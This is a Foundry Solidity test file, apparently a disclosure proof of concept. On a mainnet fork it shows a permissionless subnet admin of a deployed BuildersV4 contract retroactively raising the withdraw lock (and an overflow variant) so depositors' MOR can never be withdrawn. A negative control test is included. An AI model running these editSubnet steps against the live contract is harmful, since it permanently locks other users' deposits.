// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, stdError} from "forge-std/Test.sol";

/// J2 — BuildersV4 (Base, deployed proxy 0x42BB..): a PERMISSIONLESS subnet admin retroactively raises
/// withdrawLockPeriodAfterDeposit via editSubnet after victims deposit, permanently locking their MOR
/// principal. Foundry Base mainnet-fork PoC at pinned block 50970873. Negative control included.
/// Attacker and victim are two DISTINCT unprivileged EOAs; withdrawer is always the victim.
/// HONESTY: the "victim" is a synthetic funded address (the test scripts both sides); it is NOT a real
/// third party. At the pinned block the attacker's fresh subnet has ZERO real TVL — see out/ writeups.

interface IBuildersV4 {
    struct Subnet {
        string name;
        address admin;
        uint128 unusedStorage1_V4Update;
        uint128 withdrawLockPeriodAfterDeposit;
        uint128 unusedStorage2_V4Update;
        uint256 minimalDeposit;
        address claimAdmin;
    }
    struct SubnetMetadata { string slug; string description; string website; string image; }
    function version() external view returns (uint256);
    function depositToken() external view returns (address);
    function minimalWithdrawLockPeriod() external view returns (uint256);
    function subnetCreationFeeAmount() external view returns (uint256);
    function getSubnetId(string memory) external view returns (bytes32);
    function createSubnet(Subnet calldata, SubnetMetadata calldata) external;
    function editSubnet(bytes32, Subnet calldata) external;
    function deposit(bytes32, uint256) external;
    function withdraw(bytes32, uint256) external;
    function usersData(address, bytes32) external view returns (uint128, uint128, uint256, uint256);
}
interface IERC20 { function approve(address,uint256) external returns(bool); function balanceOf(address) external view returns(uint256); }

contract J2_Capture is Test {
    IBuildersV4 constant B = IBuildersV4(0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9);
    address attacker = address(0xA11CE);
    address victim   = address(0xBEEF);
    IERC20 MOR;
    uint256 constant AMT = 100e18; // synthetic funded amount — NOT real TVL, do not dollarize

    function setUp() public {
        vm.createSelectFork(vm.envString("BASE_ARCHIVE_RPC"), 50970873);
        MOR = IERC20(B.depositToken());
        assertEq(block.chainid, 8453, "chainid");
        assertEq(B.version(), 4, "impl version 4 (deployed bytecode binding)");
    }

    function _sub(string memory nm, uint128 lock) internal view returns (IBuildersV4.Subnet memory s) {
        s.name = nm; s.admin = attacker; s.withdrawLockPeriodAfterDeposit = lock; s.minimalDeposit = 0; s.claimAdmin = attacker;
    }
    function _meta() internal pure returns (IBuildersV4.SubnetMetadata memory m) { m.slug="s"; m.description="d"; m.website="w"; m.image="i"; }

    function _fundVictim() internal {
        deal(address(MOR), victim, AMT);
        if (MOR.balanceOf(victim) != AMT) deal(address(MOR), victim, AMT, true);
        assertEq(MOR.balanceOf(victim), AMT, "victim funded");
    }

    /// NEGATIVE CONTROL: honest (untampered) lock -> victim CAN withdraw principal after the lock.
    function test_control_honestWithdrawSucceeds() public {
        uint128 lock = uint128(B.minimalWithdrawLockPeriod());
        string memory nm = "j2-control";
        vm.prank(attacker); B.createSubnet(_sub(nm, lock), _meta());
        bytes32 id = B.getSubnetId(nm);

        _fundVictim();
        uint256 preProxy = MOR.balanceOf(address(B));
        vm.startPrank(victim);
        MOR.approve(address(B), AMT);
        B.deposit(id, AMT);
        vm.stopPrank();
        assertEq(MOR.balanceOf(address(B)), preProxy + AMT, "proxy escrowed amt");
        (, , uint256 dep, ) = B.usersData(victim, id);
        assertEq(dep, AMT, "deposited recorded");
        assertEq(MOR.balanceOf(victim), 0, "victim paid in");

        vm.warp(block.timestamp + lock + 1);
        vm.prank(victim); B.withdraw(id, AMT);
        assertEq(MOR.balanceOf(victim), AMT, "CONTROL: victim recovered principal");
        emit log_named_uint("CONTROL victim MOR after withdraw", MOR.balanceOf(victim));
    }

    /// EXPLOIT (the finding): attacker raises the lock retroactively -> victim withdraw reverts with the
    /// DESIGNED lock error, forever. Token-level escrow proof + attacker benefit == 0.
    function test_exploit_designedLock_permanentRevert() public {
        uint128 benign = uint128(B.minimalWithdrawLockPeriod());
        string memory nm = "j2-exploit";
        vm.prank(attacker); B.createSubnet(_sub(nm, benign), _meta());
        bytes32 id = B.getSubnetId(nm);

        _fundVictim();
        uint256 preProxy = MOR.balanceOf(address(B));
        uint256 preAttacker = MOR.balanceOf(attacker);
        vm.startPrank(victim);
        MOR.approve(address(B), AMT);
        B.deposit(id, AMT);
        vm.stopPrank();
        assertEq(MOR.balanceOf(address(B)), preProxy + AMT, "proxy escrowed amt");

        // Attacker retroactively raises the withdraw lock to a huge-but-non-overflowing value (same name).
        uint128 hugeLock = uint128(1) << 127; // ~1.7e38, fits uint128, never satisfiable
        vm.prank(attacker); B.editSubnet(id, _sub(nm, hugeLock));

        // Victim cannot withdraw now, nor after any realistic warp.
        vm.warp(block.timestamp + 3650 days);
        vm.prank(victim);
        vm.expectRevert(bytes("BU: user withdraw is locked"));
        B.withdraw(id, AMT);

        // TOKEN-LEVEL LOSS: principal still escrowed in the proxy, victim has nothing, attacker gained nothing.
        assertEq(MOR.balanceOf(address(B)), preProxy + AMT, "EXPLOIT: principal still locked in proxy");
        assertEq(MOR.balanceOf(victim), 0, "EXPLOIT: victim did not recover principal");
        assertEq(MOR.balanceOf(attacker), preAttacker, "EXPLOIT: attacker benefit == 0 (grief/lock, not theft)");
        (, , uint256 depAfter, ) = B.usersData(victim, id);
        assertEq(depAfter, AMT, "EXPLOIT: deposit still recorded, unwithdrawable");
        emit log_named_uint("EXPLOIT proxy MOR still locked", MOR.balanceOf(address(B)));
        emit log_named_uint("EXPLOIT victim MOR", MOR.balanceOf(victim));
    }

    /// INCIDENTAL variant: lock = type(uint128).max makes lastDeposit+lock overflow (Panic 0x11) BEFORE the
    /// timestamp check — no warp needed. Labeled separate from the designed-lock finding above.
    function test_exploit_overflowLock_panics() public {
        uint128 benign = uint128(B.minimalWithdrawLockPeriod());
        string memory nm = "j2-overflow";
        vm.prank(attacker); B.createSubnet(_sub(nm, benign), _meta());
        bytes32 id = B.getSubnetId(nm);
        _fundVictim();
        vm.startPrank(victim); MOR.approve(address(B), AMT); B.deposit(id, AMT); vm.stopPrank();

        vm.prank(attacker); B.editSubnet(id, _sub(nm, type(uint128).max));
        vm.prank(victim);
        vm.expectRevert(stdError.arithmeticError); // Panic 0x11: lastDeposit + type(uint128).max overflows
        B.withdraw(id, AMT);
    }
}
